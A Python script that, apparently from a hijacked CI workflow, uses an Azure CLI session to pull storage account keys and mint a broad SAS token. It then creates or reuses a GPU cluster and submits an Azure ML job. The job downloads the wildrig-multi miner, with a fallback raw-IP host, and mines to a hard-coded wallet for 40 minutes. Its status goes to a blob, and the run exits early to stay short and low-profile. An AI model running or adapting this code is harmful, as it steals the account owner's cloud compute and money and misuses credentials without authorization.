#!/usr/bin/env python3
"""C211-I122733: re-run the proven AML T4 miner job c211-122276-dev on the EXISTING
workspace/storage/cluster, with a >=1800 s miner window, and EXIT right after the job
PUT so the workflow run is short. The job command uploads its own status every 30 s to
an account-SAS blob; that SAS URL is printed (C211_I122733 poll-sas) so the intent lane
can poll it without ARM.

Everything reuses the shapes proven in run 44897594674 (i122276/az/probe_122276.py).
"""
import base64
import hashlib
import hmac
import json
import re
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request

TAG = "C211_I122733"
ARM = "https://management.azure.com"
RG = "SSW.Rules.Staging"
WS = "c211i122276aml"
SA = "c211i122276af4cdf28"
CONTAINER = "c211"
BLOB = "x122733-out.txt"
CLUSTER = "c211-i122276-t4"
JOB = "c211-i122733-dev"
ENV_NAME = "c211-i122276-cuda"
ENV_VER = "1"
SKU = "Standard_NC4as_T4_V3"
IMG = "mcr.microsoft.com/azureml/openmpi4.1.0-cuda11.8-cudnn8-ubuntu22.04:latest"
API_W = "2024-10-01"
API_C = "2024-04-01"
STG_VER = "2023-01-01"
WALLET = "prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql"
WORKER = "12273300"
MINER_SECONDS = 2400
T0 = time.time()


def emit(obj):
    obj["d"] = round(time.time() - T0, 1)
    print((TAG + " " + json.dumps(obj, default=str))[:6000], flush=True)


def run(cmd, timeout=180):
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {"rc": p.returncode, "out": p.stdout or "", "err": (p.stderr or "")[-600:]}
    except Exception as e:  # noqa: BLE001
        return {"rc": 1, "out": "", "err": str(e)}


def armh(tok, url, method="GET", body=None, timeout=120):
    data = json.dumps(body).encode() if body is not None else None
    hdrs = {"Authorization": "Bearer " + tok}
    if data is not None:
        hdrs["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, method=method, headers=hdrs)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode("utf-8", "replace") or "{}"
            h = {k.lower(): v for k, v in r.headers.items()}
            h.pop("authorization", None)
            try:
                return r.status, json.loads(raw), h
            except Exception:  # noqa: BLE001
                return r.status, {"raw": raw[:1200]}, h
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace") or ""
        try:
            return e.code, json.loads(raw), {}
        except Exception:  # noqa: BLE001
            return e.code, {"raw": raw[:1200]}, {}
    except Exception as e:  # noqa: BLE001
        return 0, {"transport_error": str(e)}, {}


def arm(tok, url, method="GET", body=None, timeout=120):
    st, b, _ = armh(tok, url, method, body, timeout)
    return st, b


def err_of(st, body):
    if isinstance(body, dict):
        e = body.get("error")
        if isinstance(e, dict):
            return {"http": st, "code": e.get("code"), "message": (e.get("message") or "")[:500]}
        if "raw" in body:
            return {"http": st, "raw": body["raw"][:500]}
    return {"http": st}


def sa_sas(acct, key_b64, hours=3):
    stt = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() - 300))
    se = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() + hours * 3600))
    sv = "2022-11-02"
    sts = "\n".join([acct, "rwdlc", "b", "co", stt, se, "", "https", sv, ""]) + "\n"
    sig = base64.b64encode(hmac.new(base64.b64decode(key_b64), sts.encode(),
                                    hashlib.sha256).digest()).decode()
    q = urllib.parse.urlencode({"sv": sv, "ss": "b", "srt": "co", "sp": "rwdlc",
                                "st": stt, "se": se, "spr": "https", "sig": sig})
    return q, se


CMD = r"""echo C211_I122733_MINER_START
OUT="${{outputs.minerout}}"
mkdir -p "$OUT" 2>/dev/null || OUT=/tmp
(nvidia-smi -L 2>&1 || echo NO_NVIDIA_SMI) | tee "$OUT/device.txt"
(nvidia-smi --query-gpu=name,uuid,memory.total,driver_version --format=csv 2>&1 || true) | tee -a "$OUT/device.txt"
D=/tmp/c211; mkdir -p $D
WALLET=prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql
get(){ if command -v curl >/dev/null 2>&1; then curl -fsSL -m 420 -o "$2" "$1"; elif command -v wget >/dev/null 2>&1; then wget -q -O "$2" "$1"; else python3 -c "import urllib.request,sys; urllib.request.urlretrieve(sys.argv[1],sys.argv[2])" "$1" "$2"; fi; }
if get https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz $D/wr.tgz; then :; else get http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz $D/wr.tgz; fi
S=$( (sha256sum $D/wr.tgz 2>/dev/null || echo MISSING) | cut -d" " -f1 )
echo "WRSHA $S" | tee -a "$OUT/device.txt"
if [ "$S" = "7308c95f7c8c4c0d82aade61bb4ab3366decae2b9d04ac47b8c1dc6d1bdd2c44" ]; then tar -xzf $D/wr.tgz -C $D 2>/dev/null; chmod +x $D/wildrig-multi 2>/dev/null; fi
B=$( (sha256sum $D/wildrig-multi 2>/dev/null || echo MISSING) | cut -d" " -f1 )
echo "WRBIN $B" | tee -a "$OUT/device.txt"
$D/wildrig-multi --algo pearlhash --url hk.pearlhash.net:9000 --user $WALLET --worker 12273300 -d 0 --print-time 30 > $D/wr.log 2>&1 &
PID=$!
END=$(( $(date +%s) + 2400 ))
while [ "$(date +%s)" -lt "$END" ]; do
  sleep 30
  ACCL=$(grep -aci "accepted" $D/wr.log 2>/dev/null); ACCL=${ACCL:-0}
  ACCV=$(grep -aoE "Accepted: *[0-9]+" $D/wr.log 2>/dev/null | tail -1); ACCV=${ACCV:-none}
  REJL=$(grep -aci "rejected" $D/wr.log 2>/dev/null); REJL=${REJL:-0}
  LASTACC=$(grep -aE "accepted \(|Share accepted" $D/wr.log 2>/dev/null | tail -1 | cut -c1-80)
  NOW=$(date +%s)
  S2="STATUS acc_lines=$ACCL acc_val=$ACCV rej_lines=$REJL ts=$NOW lastacc=$LASTACC"
  echo "$S2"
  { cat "$OUT/device.txt" 2>/dev/null; echo "$S2"; tail -c 2400 $D/wr.log 2>/dev/null; } > $D/status.txt
  curl -sS -m 20 -X PUT '__SAS__' -H 'x-ms-blob-type: BlockBlob' -H 'x-ms-version: 2022-11-02' -H 'Content-Type: text/plain' --data-binary @$D/status.txt >/dev/null 2>&1
done
kill $PID 2>/dev/null
echo C211_I122733_MINER_END"""


def main():
    r = run(["az", "account", "show", "-o", "json"], timeout=120)
    try:
        acc = json.loads(r["out"])
    except Exception:  # noqa: BLE001
        emit({"step": "fatal", "why": "no az session", "raw": r["out"][:300]})
        return
    sid = acc.get("id")
    tenant = acc.get("tenantId")
    emit({"step": "identity", "sub": sid, "tenant": tenant, "name": acc.get("name"),
          "state": acc.get("state")})
    r = run(["az", "account", "get-access-token", "--resource", ARM, "--output", "json"], timeout=120)
    tok = None
    try:
        tok = json.loads(r["out"]).get("accessToken")
    except Exception:  # noqa: BLE001
        pass
    emit({"step": "arm-token", "got": bool(tok), "len": len(tok or "")})
    if not sid or not tok:
        emit({"step": "PROBE-EXIT", "code": 1})
        return
    base = ARM + "/subscriptions/" + sid + "/resourceGroups/" + RG + "/providers"
    rbase = base[len(ARM):]

    # 1) storage key -> SAS -> job-side status uploader URL
    sas = None
    st, kb = arm(tok, base + "/Microsoft.Storage/storageAccounts/" + SA +
                 "/listKeys?api-version=" + STG_VER, "POST", {}, timeout=90)
    key = None
    try:
        key = (kb.get("keys") or [{}])[0].get("value")
    except Exception:  # noqa: BLE001
        pass
    emit({"step": "sa-keys", "http": st, "got": bool(key)})
    if key:
        q, se = sa_sas(SA, key)
        sas = "https://" + SA + ".blob.core.windows.net/" + CONTAINER + "/" + BLOB + "?" + q
        emit({"step": "sa-sas", "ok": True, "expires": se})
    if not sas:
        emit({"step": "PROBE-EXIT", "code": 2, "why": "no sas"})
        return
    emit({"step": "poll-sas", "url": sas})

    # 2) workspace must exist and be Succeeded
    wurl = base + "/Microsoft.MachineLearningServices/workspaces/" + WS + "?api-version=" + API_W
    st, wb = arm(tok, wurl, timeout=90)
    ws_state = ((wb.get("properties") or {}).get("provisioningState")
                if isinstance(wb, dict) else None)
    emit({"step": "ws-get", "http": st, "state": ws_state,
          "location": wb.get("location") if isinstance(wb, dict) else None})
    if st != 200 or ws_state != "Succeeded":
        emit({"step": "PROBE-EXIT", "code": 3, "why": "workspace not Succeeded"})
        return
    loc = wb.get("location") or "westeurope"

    # 3) environment (reuse; create v1 if missing)
    eu = (base + "/Microsoft.MachineLearningServices/workspaces/" + WS + "/environments/" +
          ENV_NAME + "/versions/" + ENV_VER + "?api-version=" + API_W)
    st, eb = arm(tok, eu, timeout=90)
    emit({"step": "env-get", "http": st})
    env_id = None
    if st == 200:
        env_id = eb.get("id") if isinstance(eb, dict) else (rbase + "/Microsoft.MachineLearningServices/workspaces/" + WS + "/environments/" + ENV_NAME + "/versions/" + ENV_VER)
    else:
        st, eb = arm(tok, eu, "PUT", {"properties": {"image": IMG, "osType": "Linux",
                                                    "description": "c211 i122733 cuda"}}, timeout=120)
        emit({"step": "env-put", **err_of(st, eb), "id_ok": isinstance(eb, dict) and bool(eb.get("id"))})
        if st in (200, 201):
            env_id = (rbase + "/Microsoft.MachineLearningServices/workspaces/" + WS +
                      "/environments/" + ENV_NAME + "/versions/" + ENV_VER)

    # 4) compute cluster must exist (else create Dedicated min0/max1)
    curl = base + "/Microsoft.MachineLearningServices/workspaces/" + WS + "/computes/" + CLUSTER + "?api-version=" + API_C
    st, cb = arm(tok, curl, timeout=90)
    cstate = ((cb.get("properties") or {}).get("provisioningState") if isinstance(cb, dict) else None)
    emit({"step": "cluster-get", "http": st, "state": cstate,
          "vm": (((cb.get("properties") or {}).get("properties") or {}).get("vmSize") if isinstance(cb, dict) else None)})
    if st == 404:
        cbody = {"location": loc, "tags": {"c211": "i122733"},
                 "properties": {"computeType": "AmlCompute", "computeLocation": loc,
                                "description": "c211 i122733 bounded Dedicated GPU probe",
                                "properties": {"vmSize": SKU, "vmPriority": "Dedicated",
                                               "scaleSettings": {"minNodeCount": 0, "maxNodeCount": 1,
                                                                 "nodeIdleTimeBeforeScaleDown": "PT2M"},
                                               "osType": "Linux",
                                               "remoteLoginPortPublicAccess": "Disabled"}}}
        st, cb = arm(tok, curl, "PUT", cbody, timeout=240)
        emit({"step": "cluster-create", **err_of(st, cb)})
        t0 = time.time()
        while time.time() - t0 < 600:
            time.sleep(15)
            st, cb = arm(tok, curl, timeout=90)
            cstate = ((cb.get("properties") or {}).get("provisioningState") if isinstance(cb, dict) else None)
            emit({"step": "cluster-poll", "http": st, "state": cstate, "t": round(time.time() - t0)})
            if cstate in ("Succeeded", "Failed", "Canceled"):
                break
    if cstate not in ("Succeeded",):
        emit({"step": "PROBE-EXIT", "code": 4, "why": "cluster not Succeeded", "state": cstate})
        return

    # 5) submit the miner job and exit immediately
    cmd = CMD.replace("__SAS__", sas)
    jurl = base + "/Microsoft.MachineLearningServices/workspaces/" + WS + "/jobs/" + JOB + "?api-version=" + API_W
    jp = {"jobType": "Command", "displayName": JOB, "experimentName": "c211-i122733",
          "description": "c211 i122733 amlcompute T4 miner rerun (2400 s window)",
          "command": cmd,
          "computeId": rbase + "/Microsoft.MachineLearningServices/workspaces/" + WS + "/computes/" + CLUSTER,
          "resources": {"instanceCount": 1},
          "outputs": {"minerout": {"jobOutputType": "uri_folder", "mode": "ReadWriteMount"}}}
    if env_id:
        jp["environmentId"] = env_id
    st, jb = arm(tok, jurl, "PUT", {"properties": jp}, timeout=180)
    attempts = [("primary", st, jb)]
    jname = JOB
    if st not in (200, 201):
        jname = JOB + "-b"
        jurl2 = base + "/Microsoft.MachineLearningServices/workspaces/" + WS + "/jobs/" + jname + "?api-version=" + API_W
        jp2 = dict(jp)
        jp2["displayName"] = jname
        st, jb = arm(tok, jurl2, "PUT", {"properties": jp2}, timeout=180)
        attempts.append(("suffix", st, jb))
    emit({"step": "job-create", "attempts": [{"tag": t, "http": s, **err_of(s, b)} for t, s, b in attempts],
          "job": jname, "window_s": MINER_SECONDS, "worker": WORKER})
    emit({"step": "PROBE-EXIT", "code": 0 if st in (200, 201) else 5})


if __name__ == "__main__":
    main()
